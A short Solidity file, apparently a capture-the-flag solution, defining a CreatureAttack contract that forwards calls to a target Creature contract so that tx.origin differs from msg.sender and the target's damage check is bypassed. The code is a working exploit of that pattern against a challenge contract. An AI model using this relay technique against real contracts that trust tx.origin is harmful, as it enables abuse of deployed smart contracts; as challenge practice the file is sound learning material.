/// about: This contract is created to attack the creature contract. The
///        creature contract requires tx.origin != msg.sender to do damage
///        to it. So this contract will simply call the attack function.

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract CreatureAttack {
    Creature public immutable TARGET;

    constructor(address _target) {
        TARGET = Creature(_target);
    }

    function attack(uint256 _damage) public {
        TARGET.attack(_damage);
    }
}